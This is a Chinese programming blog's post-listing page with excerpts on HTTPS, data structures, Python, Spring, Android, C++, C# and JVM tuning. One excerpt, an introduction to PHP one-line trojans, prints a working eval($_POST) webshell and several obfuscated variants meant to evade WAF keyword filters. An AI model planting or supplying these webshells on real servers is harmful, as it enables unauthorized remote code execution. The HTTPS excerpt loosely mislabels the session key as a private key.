<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Posts - 编程随想</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="Posts" />
<meta property="og:description" content="编程随想的博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="/posts/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/posts/index.xml" title="编程随想">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程随想" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程随想</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<header class="main__header">
		<h1 class="main__title">Posts</h1>
	</header><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5ce8b4a9ee5a2c5d74a834f46553fbbd/" rel="bookmark">
			http、https 协议运行过程  公钥私钥，证书存放位置，传递证书，（非）对称加密。
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 http
采用的TCP / IP通信协议，http默认的是 80 端口。主要特点：
1、无连接
2、无状态
3、媒体独立
参考： https://blog.csdn.net/qq_41291945/article/details/106328304 https
在http的基础上添加了加密协议，默认端口是 443。
HTTP协议的请求过程如下：
1、客户端发起 HTTPS 请求
这个没什么好说的，就是用户在浏览器里输入一个 https 网址，然后连接到 server 的 443 端口。
2、服务端的配置
采用 HTTPS 协议的服务器必须要有一套数字证书，可以自己制作，也可以向组织申请，区别就是自己颁发的证书需要客户端验证通过，才可以继续访问，而使用受信任的公司申请的证书则不会弹出提示页面(startssl 就是个不错的选择，有 1 年的免费服务)。
这套证书其实就是一对公钥和私钥，如果对公钥和私钥不太理解，可以想象成一把钥匙和一个锁头，只是全世界只有你一个人有这把钥匙，你可以把锁头给别人，别人可以用这个锁把重要的东西锁起来，然后发给你，因为只有你一个人有这把钥匙，所以只有你才能看到被这把锁锁起来的东西。
3、传送证书
这个证书其实就是公钥，只是包含了很多信息，如证书的颁发机构，过期时间等等。
4、客户端解析证书
这部分工作是有客户端的TLS来完成的，首先会验证公钥是否有效，比如颁发机构，过期时间等等，如果发现异常，则会弹出一个警告框，提示证书存在问题。
如果证书没有问题，那么就生成一个随机值，然后用证书对该随机值进行加密，就好像上面说的，把随机值用锁头锁起来，这样除非有钥匙，不然看不到被锁住的内容。
5、传送加密信息
这部分传送的是用证书加密后的随机值，目的就是让服务端得到这个随机值，以后客户端和服务端的通信就可以通过这个随机值来进行加密解密了。
6、服务端解密信息
服务端用私钥解密后，得到了客户端传过来的随机值(私钥)，然后把内容通过该值进行对称加密，所谓对称加密就是，将信息和私钥通过某种算法混合在一起，这样除非知道私钥，不然无法获取内容，而正好客户端和服务端都知道这个私钥，所以只要加密算法够彪悍，私钥够复杂，数据就够安全。
7、传输加密后的信息
这部分信息是服务段用私钥加密后的信息，可以在客户端被还原。
8、客户端解密信息
客户端用之前生成的私钥解密服务段传过来的信息，于是获取了解密后的内容，整个过程第三方即使监听到了数据，也束手无策。
主要问题如下
0、公钥、密钥
就好像是一把锁一样，使用公钥加密的文件必须用私钥来解密。
1、如何加密
客户端会在检查公钥后随机生成一个随机数（私钥），然后用公钥对该数据加密，随后传送给服务端，服务端用证书中的私钥解密数据得到客户端发送的私钥，然后对数据进行对称加密， 加密时候使用客户端发送的私钥。此时客户端发送的私钥是服务端和客户端都知道的。客户端在接受到该加密信息后使用私钥解密即可。
2、对称加密
将需要加密的信息和私钥结合到一起，只要知道私钥就可以实现解密。
3、非对称加密
类似于公钥和私钥，信息使用公钥加密、随后使用私钥进行解密。
4、证书在那里放着
在服务端存放着
5、证书如何传递
客户端发起请求的时候，会响应证书。
6、完成的请求过程
https://www.runoob.com/w3cnote/http-vs-https.html https://www.runoob.com/w3cnote/https-ssl-intro.html https://www.runoob.com/tcpip/tcpip-intro.html https://blog.csdn.net/weixin_44198965/article/details/90083126 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2ab79aed2ac61b77ceec05ee41d3d23e/" rel="bookmark">
			每日一题Day13 链式修改
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		基于链式存储结构的图书信息表的修改 题目描述
定义一个包含图书信息（书号、书名、价格）的链表，读入相应的图书数据完成图书信息表
的创建，然后计算所有图书的平均价格，将所有低于平均价格的图书价格提高
20%，所有高于或等于平均价格的图书价格提高 10%，最后逐行输出价格修改后的图书信息。
输入描述
输入 n+1 行，前 n 行是 n 本图书的信息（书号、书名、价格），每本图书信息占一行，书号、
书名、价格用空格分隔，价格之后没有空格。
最后第n+1 行是输入结束标志：0 0 0（空格分隔的三个 0）。
其中书号和书名为字符串类型，价格为浮点数类型。
输出描述
总计
n+1 行，第 1 行是修改前所有图书的平均价格，后 n 行是价格修改后 n 本图书的信息，
每本图书信息占一行，书号、书名、价格用空格分隔。其中价格输出保留两位小数。
样例输入
9787302257646 程序设计基础 25.00 9787302164340 程序设计基础（第2版） 20.00 9787302219972 单片机技术及应用 32.00 9787302203513 单片机原理与应用技术 26.00 9787810827430 工业计算机控制技术——原理与应用 29.00 9787811234923 汇编语言程序设计教程 21.00 0 0 0 样例输出
25.50 9787302257646 程序设计基础 30.00 9787302164340 程序设计基础（第2版） 24.00 9787302219972 单片机技术及应用 35.20 9787302203513 单片机原理与应用技术 28.60 9787810827430 工业计算机控制技术——原理与应用 31.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2ab79aed2ac61b77ceec05ee41d3d23e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9581e442dd42690bb4daae342dc13013/" rel="bookmark">
			三位数水仙花数的计算与改进
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		初学Python，记录学习路径
水仙花数指的是其各位数字的3次方和等于该数本身。
三位数的水仙花数
s = "" for i in range(100, 1000): t = str(i)#字符串就相当于一个小型的字典类型，位置是建，内容是值 if pow(eval(t[0]),3) + pow(eval(t[1]),3) + pow(eval(t[2]),3) == i : s += "{}，".format(i)#这里的逗号指的是数字之间的分割符 print(s[:-1])#这里采用了s[:-1]方式不输出最后一个逗号。也可以把所有结果放到一个列表中，采用字符串的.join()方法输出结果。 然后我试图用.join()函数去写这段代码
第一次：
s = "" for i in range(100, 1000): t = str(i) if pow(eval(t[0]),3) + pow(eval(t[1]),3) + pow(eval(t[2]),3) == i : s += "{}，".format(i) print(",".join(s)) 然后发现结果是
1,5,3,3,7,0,3,7,1,4,0,7 仔细一想原来是s在被合并后没有了间隔
于是为了人为的创造间隔，我选用了列表
第二次：
s=[]#creat a new list for i in range(100, 1000): t = str(i)#字符串就相当于一个小型的字典类型，位置是建，内容是值 if pow(eval(t[0]),3) + pow(eval(t[1]),3) + pow(eval(t[2]),3) == i : s.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9581e442dd42690bb4daae342dc13013/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/27a8dbf441ba65f8c3240a25c412320a/" rel="bookmark">
			【VS】常见错误：C4996	‘fopen‘: This function or variable may be unsafe. Consider using fopen_s instead解决办法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		【VS】常见错误 错误：
C4996 ‘fopen’: This function or variable may be unsafe. Consider using fopen_s instead. To disable deprecation, use _CRT_SECURE_NO_WARNINGS. See online help for details.
解决方法：
方法一：加 #define _CRT_SECURE_NO_DEPRECATE；
方法二：加 #define _CRT_SECURE_NO_WARNINGS；
方法三：加 #pragma warning(disable:4996)；
方法四：把scanf、fopen等改为scanf_s、fopen_s，改完之后的函数使用方法会发生改变，具体用法请自行查阅官网；
方法五：右键项目—&gt; 属性—&gt; 配置属性—&gt; C/C+±–&gt; 常规—&gt; SDL检查—&gt; 改成“否”；
方法六：右键项目—&gt; 属性—&gt; 配置属性—&gt; C/C+±–&gt; 命令行—&gt; 添加：/D _CRT_SECURE_NO_WARNINGS。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8875d1b7745502dc9d94efd8a51a5d16/" rel="bookmark">
			软件工程工程伦理案例分析_案例工具及其范围| 软件工程
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		软件工程工程伦理案例分析
A CASE (Computer-Aided Software Engineering) tool is a non-exclusive term used to indicate any form of automated support for software engineering. In an increasingly prohibitive sense, a CASE tool implies any tools used to automate some action related to software development. Many CASE tools are available to make software engineering development easy and efficient.
CASE(计算机辅助软件工程)工具是一个非排他性术语，用于指示对软件工程的任何形式的自动化支持。 在日益禁止的意义上，CASE工具意味着任何用于自动化与软件开发相关的操作的工具。 许多CASE工具可用来使软件工程开发变得容易和高效。 A portion of these CASE tools aid stage-related undertakings, for example, specification, structured analysis, design, testing, coding, feedback, etc.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8875d1b7745502dc9d94efd8a51a5d16/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3ed1cbca9f25ff5260cb730083aef69e/" rel="bookmark">
			apng转gif
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 用ffmpeg即可，下载地址：https://ffmpeg.zeranoe.com/builds/
命令格式是：
ffmpeg -i [输入文件名] [参数选项] -f [格式] [输出文件]
例：
./ffmpeg.exe -i in.png -f gif out.gif 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/faa615d34b65be5aceb8a640c02e6af3/" rel="bookmark">
			Spring的事务实现原理与传播机制
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、Spring的事务实现原理 （1）在要开启事务的方法上加@Transactional注解；
（2）此时Spring就会使用AOP的思想，对你的这个方法在执行之前，先去开启事务，执行完毕之后根据方法是否报错，决定回滚或者提交事务。
二、事务的传播机制 1、事务传播机制的概念，如：
@Transactional(propagation = Propagation.REQUIRED) public void methodA(){ methodB(); } @Transactional(propagation = Propagation.REQUIRED) public void methodB(){ //do something } 方法A上加了Transactional事务注解，方法B上也加了Transactional事务注解；
当一个事务方法去调用另一个事务方法的时候，事务应该怎样进行传播？
2、事务的传播级别
（1） PROPAGATION_REQUIRED：如果存在一个事务，则支持当前事务。如果没有事务则开启一个新的事务。
（2）PROPAGATION_SUPPORTS：如果存在一个事务，支持当前事务。如果没有事务，则非事务的执行。但是对于事务同步的事务管理器，PROPAGATION_SUPPORTS与不使用事务有少许不同。
（3）PROPAGATION_MANDATORY：如果已经存在一个事务，支持当前事务。如果没有一个活动的事务，则抛出异常。
（4）PROPAGATION_REQUIRES_NEW：总是开启一个新的事务。如果一个事务已经存在，则将这个存在的事务挂起。
（5）PROPAGATION_NOT_SUPPORTED：总是非事务地执行，并挂起任何存在的事务。
（6）PROPAGATION_NEVER：总是非事务地执行，如果存在一个活动事务，则抛出异常。
（7）PROPAGATION_NESTED：如果一个活动的事务存在，则运行在一个嵌套的事务中. 如果没有活动事务, 则按TransactionDefinition.PROPAGATION_REQUIRED 属性执行。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7e91700749656f48e02a14f83dbf3d86/" rel="bookmark">
			欧拉函数最全总结
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 欧拉函数的内容一、欧拉函数的引入二、欧拉函数的定义三、欧拉函数的性质四、欧拉函数的计算方法（一）素数分解法（二）编程思维1.求n以内的所有素数2.求φ(n)3.格式化输出0-100欧拉函数表（“x?”代表十位数，“x”代表个位数） 五、欧拉函数相关定理以及证明（一）定理1：缩系与欧拉函数的关系（二）定理2：缩系的充要条件（三）定理3：缩系拓展1. 简单证明：(a,m)=1，(x,m)=1，故(ax,m)=1。 （四）定理4：设m＞1，(a,m)=1,则aφ(m)≡1(mod m).1. 若ac≡bc(mod m),且若(m,c)则a≡b(mod m/d). （五）定理5：若p是素数，则对于每个整数a，有ap≡a(mod p).（六）定理6：设m1＞0，m2＞0，(m1,m2)=1，x1,x2分别通过模数m1,m2的缩系，则m2x1+m1x2通过模数m1m2的缩系.（七）定理7：欧拉函数的一般计算方法 六、欧拉函数的应用（一）应用一：证明相关题目（二）应用二：求原根个数以及全部原根1. 原根个数2. 全部原根 （三）应用三：RSA算法 测试（一）termcolor库的使用（二）全局变量和局部变量 欧拉函数的内容 欧拉函数的引入欧拉函数的定义欧拉函数的基本性质欧拉函数的计算方法欧拉函数的相关定理以及证明欧拉函数的应用 一、欧拉函数的引入 首先引入互质关系：
如果两个正整数，除了1以外，没有其他公因子，我们就称这两个数是互质关系（coprime）。比如，15和32没有公因子，所以它们是互质关系。这说明，不是质数也可以构成互质关系。 其次引进缩系得概念：
在与模数m互素的全部剩余类中，各取一数所组成的集叫做模数m的一组缩系。 在讨论缩系的过程中，需要引入一个常用的数论函数–欧拉函数φ(n)。
请思考以下问题： 任意给定正整数n，请问在小于等于n的正整数之中，有多少个与n构成互质关系？（比如，在1到8之中，有多少个数与8构成互质关系？） 计算这个值的方法就叫做欧拉函数，以φ(n)表示。在1到8之中，与8形成互质关系的是1、3、5、7，所以 φ(n) = 4。
二、欧拉函数的定义 定义： 欧拉函数φ(n)是一个定义在正整数集上得函数，φ(n)的值等于序列0，1，2，…，n-1中与n互素的数的个数。 此函数以其首名研究者欧拉命名(Euler’s totient function)，它又称为Euler’s totient function、φ函数、欧拉商数等。
特别的，φ(1)=1（和1互质的数(小于等于1)就是1本身）。 函数表： 三、欧拉函数的性质 当p是素数时，φ§=p-1。
欧拉函数是积性函数,但不是完全积性函数。
当且只当n可以分解成两个互质的整数之积，n = p1 × p2，则φ(n) = φ(p1p2) = φ(p1)φ(p2)
特别的，对于两个素数p,q， φ(pq)=(p-1)(q-1)。(RSA算法应用）
当n＞2时,φ(n)都是偶数，也即φ(n)≡0（mod2)。
简单证明，因为若n是质数p的k次幂，φ(n)=pk-pk-1=(p-1)pk-1
当p为2时，pk-1必为偶数;
当p＞2时，(p-1)必为偶数。
四、欧拉函数的计算方法 （一）素数分解法 1.对于一个正整数N的素数幂分解N=P1q1P2q2…Pnqn，其中，Pi为素数（1≤i≤n)。
根据第二条性质得到：
φ(N)=φ(P1q1P2q2…Pnqn)=φ(P1q)φ(P2q2)…φ(Pnqn)
注意：每种质因数只有一个。
若n是质数p的k次幂，φ(n)=pk-pk-1=(p-1)pk-1，因为除了p的倍数外，其他数都跟n互质。
简单证明：φ(n)=pk-pk-1=(p-1)pk-1
证明：
由φ(n)的定义值，φ(pk)等于从pk减去在1，…，pk中与p不互素的数的个数。因为p是素数，故φ(pk)等于从pk减去在1，…，pk中被p整除的数的个数。而在
1，…，p，p+1，…，2p，…，pa-1 * p
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7e91700749656f48e02a14f83dbf3d86/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/868a682917b910328da2ae08bc543bbf/" rel="bookmark">
			Android 入门第二讲03-约束布局ConstraintLayout（可视化介绍，Chains链，MATCH_CONSTRAIN，百分比布局，圆形定位，Guideline，Barrier）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Android 入门第二讲03-约束布局ConstraintLayout（可视化介绍，Chains链，MATCH_CONSTRAIN，百分比布局，圆形定位，Guideline，Barrier） 1.可视化介绍2.Chains链3.MATCH_CONSTRAIN4.百分比布局5.ConstraintLayout的高级用法 Android 入门第二讲02-相对布局RelativeLayout（线性布局缺点，相对布局属性，qq说说ui模仿，相对布局缺点） 约束布局ConstraintLayout 介绍：约束布局是2016年在Google io大会上提出来的技术 1.可视化介绍 1.基本介绍
提示：魔法棒不适用于复杂定位约束，因为可能会发生约束冲突，不够精准。
2.给控件添加约束的方法
1. 魔法棒一键添加约束（适合简单ui）
2. 代码进行约束
约束布局基本属性
app:layout_constraintLeft_toLeftOf="" 控件左边缘相对id控件左边缘
app:layout_constraintLeft_toRightOf="" 控件左边缘相对id控件右边缘
app:layout_constraintRight_toLeftOf="" 控件右边缘相对id控件左边缘
app:layout_constraintRight_toRightOf="" 控件右边缘相对id控件右边缘
app:layout_constraintTop_toTopOf="" 控件顶部相对id控件顶部
app:layout_constraintTop_toBottomOf="" 控件顶部相对id控件底部
app:layout_constraintBottom_toTopOf="" 控件底部相对id控件顶部
app:layout_constraintBottom_toBottomOf="" 控件底部相对id控件底部
例如 app:layout_constraintRight_toLeftOf="" 控件右边缘相对id控件左边缘
3.通过弹簧添加约束
通过拖动小圆点到指定约束，再到属性界面添加间距
举例一：居中
举例二：控件相对控件之间
2.Chains链 Chain 链是一种特殊的约束让多个 chain 链连接的 Views 能够平分剩余空间位置。类似Android中 LinearLayout 中的权重比 weight ，但 Chains 链能做到的远远不止权重比 weight 的功能。与前端中的flex布局很类似
1.怎么使用Chains链
1.举例1-均分
第一步
第二步
效果
举例2-两边占据，中间均分（基于举例一的情况下）
效果
举例3-占据中间，两边均分（重复举例2操作）
效果
3.MATCH_CONSTRAIN 尺寸单位
WRAP_CONTENTMATCH_PARENTdpMATCH_CONSTRAIN（0dp）根据约束或者要求自适应 4.百分比布局 ConstraintLayout百分比布局
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/868a682917b910328da2ae08bc543bbf/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c5e89ebabd3a7a7a8edc720826ee8672/" rel="bookmark">
			003 C&#43;&#43;与STL入门（2):结构体struct/class、模板template的使用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		(1)结构体
C++中除了支持Struct结构体以外还支持class结构体，在工程中一般用struct定义纯数据类型，用class定义拥有复杂行为的类型，事实上在C++中两者最主要的区别是默认访问权限和继承方式不同，其他方面的差异很小。
结构体具有许多功能，也十分的复杂。
①结构体除了可以包含成员变量，还可以包含成员函数。
②结构体可以定义操作。
给出一段代码：
#include &lt;iostream&gt; using namespace std; struct Point { int x,y; Point(int x=0, int y=0):x(x),y(y){} /*在结构体中定义了一个函数，函数名为Point 无返回值，这样的函数称为构造函数（ctor） 在定义时有=0字样说明，若在使用结构体时不进行定义则默认为0 “：x(x),y(y)”是一个简化的写法表示“把成员变量x初始化为参数x，y初始化为y” 同样的写法：*/ //Point(int x=0,int y=0){this-&gt;x=x;this-&gt;y=y;}//this 是指向当前结构体的指针 }; Point operator + (const Point&amp; A,const Point&amp; B) { return Point(A.x+B.x,A.y+B.y); //定义了对Point结构体执行操作“+”加 的处理方法：返回Point结构体中的x，y为相加结构体中x，y分别相加 } ostream&amp; operator &lt;&lt; (ostream &amp;out,const Point&amp; p) { out&lt;&lt;"("&lt;&lt;p.x&lt;&lt;","&lt;&lt;p.y&lt;&lt;")"; return out; //重载了输出操作流，使得结构体可以直接输出：cout&lt;&lt;p;输出样式是：（x，y） } int main() { Point a, b(1,2);//易知a是（0，0） a.x=3; cout &lt;&lt; a+b &lt;&lt;endl; return 0; } 这段代码中Point表示二维平面点坐标，输出形式为（x，y），加的形式为（x1+x2,y1+y2)
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c5e89ebabd3a7a7a8edc720826ee8672/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f9ad515ef02f85fb63a71b3803ba27ca/" rel="bookmark">
			C#学习（十五）——窗体控件用法大全
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		C#控件及常用设计整理 1、窗体 1.1、常用属性**
（1）Name属性：用来获取或设置窗体的名称，在应用程序中可通过Name属性来引用窗体。
（2） WindowState属性： 用来获取或设置窗体的窗口状态。 取值有三种： Normal （窗体正常显示）、 Minimized
（窗体以最小化形式显示）和 Maximized（窗体以最大化形式显示）。
（3）StartPosition属性：用来获取或设置运行时窗体的起始位置。
（4）Text属性：该属性是一个字符串属性，用来设置或返回在窗口标题栏中显示的文字。
（5）Width属性：用来获取或设置窗体的宽度。
（6）Height属性：用来获取或设置窗体的高度。
（7）Left属性：用来获取或设置窗体的左边缘的x坐标（以像素为单位）。
（8）Top属性：用来获取或设置窗体的上边缘的y坐标（以像素为单位）。
（9）ControlBox属性：用来获取或设置一个值，该值指示在该窗体的标题栏中是否显示控制框。值为true
时将显示控制框，值为false时不显示控制框。
（10）MaximizeBox属性：用来获取或设置一个值，该值指示是否在窗体的标题栏中显示最大化按钮。值
为 true时显示最大化按钮，值为false时不显示最大化按钮。
（11）MinimizeBox 属性：用来获取或设置一个值，该值指示是否在窗体的标题栏中显示最小化按钮。值
为 true时显示最小化按钮，值为false时不显示最小化按钮。
（12）AcceptButton 属性：该属性用来获取或设置一个值，该值是一个按钮的名称，当按 Enter 键时就相
当于单击了窗体上的该按钮。
（13）CancelButton 属性：该属性用来获取或设置一个值，该值是一个按钮的名称，当按 Esc 键时就相当
于单击了窗体上的该按钮。
（14）Modal 属性：该属性用来设置窗体是否为有模式显示窗体。如果有模式地显示该窗体，该属性值为
true；否则为 false。当有模式地显示窗体时，只能对模式窗体上的对象进行输入。必须隐藏或关闭模式窗
体（通常是响应某个用户操作），然后才能对另一窗体进行输入。有模式显示的窗体通常用做应用程序中
的对话框。
（15）ActiveControl属性：用来获取或设置容器控件中的活动控件。窗体也是一种容器控件。
（16）ActiveMdiChild属性：用来获取多文档界面（MDI）的当前活动子窗口。
（17）AutoScroll 属性：用来获取或设置一个值，该值指示窗体是否实现自动滚动。如果此属性值设置为
true，则当任何控件位于窗体工作区之外时，会在该窗体上显示滚动条。另外，当自动滚动打开时，窗体
的工作区自动滚动，以使具有输入焦点的控件可见。
（18）BackColor属性：用来获取或设置窗体的背景色。
（19）BackgroundImage属性：用来获取或设置窗体的背景图像。
（20）Enabled 属性：用来获取或设置一个值，该值指示控件是否可以对用户交互作出响应。如果控件可以对用户交互作出响应，则为 true；否则为false。默认值为true。
（21）Font属性：用来获取或设置控件显示的文本的字体。
（22）ForeColor属性：用来获取或设置控件的前景色。
（23）IsMdiChild属性：获取一个值，该值指示该窗体是否为多文档界面（MDI）子窗体。值为 true时，
是子窗体，值为false时，不是子窗体。
（24）IsMdiContainer 属性：获取或设置一个值，该值指示窗体是否为多文档界面（MDI）中的子窗体的
容器。值为true时，是子窗体的容器，值为false时，不是子窗体的容器。
（25）KeyPreview属性：用来获取或设置一个值，该值指示在将按键事件传递到具有焦点的控件前，窗体
是否将接收该事件。值为true时，窗体将接收按键事件，值为false时，窗体不接收按键事件。
（26）MdiChildren属性：数组属性。数组中的每个元素表示以此窗体作为父级的多文档界面（MDI）子窗
体。
（27）MdiParent属性：用来获取或设置此窗体的当前多文档界面（MDI）父窗体。
（28）ShowInTaskbar属性：用来获取或设置一个值，该值指示是否在Windows任务栏中显示窗体。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f9ad515ef02f85fb63a71b3803ba27ca/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9b3cb05c9405de6db1f99c5a361d3a45/" rel="bookmark">
			php 一句话木马简介
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一句话木马就是一段简单的代码，就这短短的一行代码，就能做到和大马相当的功能。一句话木马短小精悍，而且功能强大，隐蔽性非常好，在入侵中始终扮演着强大的作用。
一句话木马工作原理 &lt;?php @eval($_POST['shell']);?&gt;
这是php的一句话后门中最普遍的一种。它的工作原理是：
首先存在一个名为shell的变量，shell的取值为HTTP的POST方式。Web服务器对shell取值以后，然后通过eval()函数执行shell里面的内容。
实例：
&lt;?php @eval($_POST['shell']);?&gt; 将以上代码写入webshell.php文件中然后放在站点目录下通过浏览器访问，以POST方式传入shell=phpinfo();
也可以用蚁剑或菜刀等工具连接（我这里用的是蚁剑）：
在url地址框中输入http://127.0.0.1/webshell.php，在连接密码框中输入shell
然后就可以看到目标站点目录下的文件了
一句话木马的多种变形 一般的php一句话后门很容易被网站防火墙waf拦截，而waf通常通过判断关键字来辨别一句话木马，要想绕过waf就需要对木马进行一些变形。
php变量
&lt;?php $a = "assert"; $a(@$_POST['shell']); ?&gt; 第三行使用了变量函数$a，变量储存了函数名asse，便可以直接用变量替代函数名。
php变量简单变形1
&lt;?php $a="TR"."Es"."sA"; $b=strtolower($a); $c=strrev($b); @$c($_POST['shell']); ?&gt; 使用字符串拼接、大小写混淆、字符串逆序组合而成
php变量简单变形2
&lt;?php $a="AssERT"; $b=strtolower($a); @$b($_POST['shell']); ?&gt; 使用大小写混淆配合字符串转小写函数strtolower组合而成
PHP可变变量
&lt;?php $bb="assert"; $a='bb'; $$aa($_POST['shell']); ?&gt; 以上代码可表示为$$aa = $($aa) = $ (‘bb’) = $bb = "assert"
自定义函数
&lt;?php function fun($a){ @eval($a); } @fun($_POST['shell']); ?&gt; 使用function自定义函数，然后函数来调用eval函数
create_function函数
&lt;?php $fun = create_function('',$_POST['shell']); $fun(); ?
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9b3cb05c9405de6db1f99c5a361d3a45/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5d67e9b69497b0bd39077a75e45d768d/" rel="bookmark">
			java8默认内存收集器_使用正确的垃圾收集器将Java内存使用量降至最低
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		java8默认内存收集器
大小对于软件至关重要。 很明显，与大的整体方法相比，在微服务体系结构中使用小片段具有更多优势。 最新的Java版本的Jigsaw有助于分解旧应用程序或从头开始构建新的云原生应用程序。 这种方法减少了磁盘空间，构建时间和启动时间。 但是，它对RAM使用管理没有足够的帮助。 众所周知，Java在许多情况下会消耗大量内存。 同时，许多人还没有注意到Java在内存使用方面已经变得更加灵活，并且提供了满足微服务需求的功能。 在本文中，我们将分享我们的经验，如何在Java进程中调整RAM的使用以使其更具弹性，并获得更快的扩展和更低的总体拥有成本（TCO）的好处。 缩放有三个选项：垂直，水平和两者的组合。 为了最大化结果，首先您需要以最佳方式设置垂直缩放。 然后，当您的项目水平增长时，单个容器内的预配置资源消耗将被复制到每个实例，并且效率将成比例地增长。 如果配置正确，则垂直缩放可完美地适用于微服务和整体组件，并根据容器内的当前负载优化内存和CPU使用率。 选定的垃圾收集器是主要的基础砖之一，其设置会影响整个项目。 OpenJDK有五种广泛使用的垃圾收集器解决方案： G1 平行 ConcMarkSweep（CMS） 序列号 雪兰多 让我们看看它们在缩放方面的表现以及可以应用哪些设置来改善结果。 为了进行测试，我们将使用一个示例Java应用程序来帮助跟踪JVM垂直缩放结果： https : //github.com/jelastic/java-vertical-scaling-test 将为每个GC测试启动以下JVM启动选项： java -XX:+Use[gc_name]GC -Xmx2g -Xms32m -jar app.jar [sleep] 哪里： [gc_name]将替换为特定的垃圾收集器类型 Xms是扩展步骤（本例中为32 MB） Xmx是最大缩放限制（本例中为2 GB） [sleep]是内存加载周期之间的间隔（以毫秒为单位），默认值为10 目前，为了完全释放未使用的资源，需要调用Full GC。 可以使用各种选项轻松启动它： jcmd &lt;pid&gt; GC.run –执行外部调用 System.gc() – 源代码内 jvisualvm –通过出色的VisualVM故障排除工具手动进行 -javaagent:agent.jar –可插入的常用方法。 Github repo Java Memory Agent上提供了开源自动化附件。 可以在输出日志中跟踪内存使用情况，或使用VisualVM进行更深入的查看。 G1垃圾收集器 对于Java生态系统来说，好消息是，从JDK 9开始，默认情况下启用了现代收缩的G1垃圾收集器。 如果使用较低版本的JDK，则可以使用-XX:+UseG1GC参数启用G1。 G1的主要优点之一是能够压缩可用的内存空间，而无需花费较长的暂停时间和不提交未使用的堆的能力。 我们发现，对于在OpenJDK或HotSpot JDK上运行的Java应用程序进行垂直扩展，该GC是最佳选择。 为了更好地了解JVM在不同内存压力级别下的行为，我们将运行以下三种情况：1）快速，2）中速和3）内存使用量增长缓慢。 通过这种方式，我们可以检查G1人机工程学的智能程度以及GC如何处理不同的内存使用动态。 内存使用量快速增长 java -XX:+UseG1GC -Xmx2g -Xms32m -jar app.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5d67e9b69497b0bd39077a75e45d768d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/814a60b9c47eefcf65b4cd39f2ee0646/" rel="bookmark">
			c语言统计英文大小写字母，空格，数字，以及其他字符的个数并以#结束
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
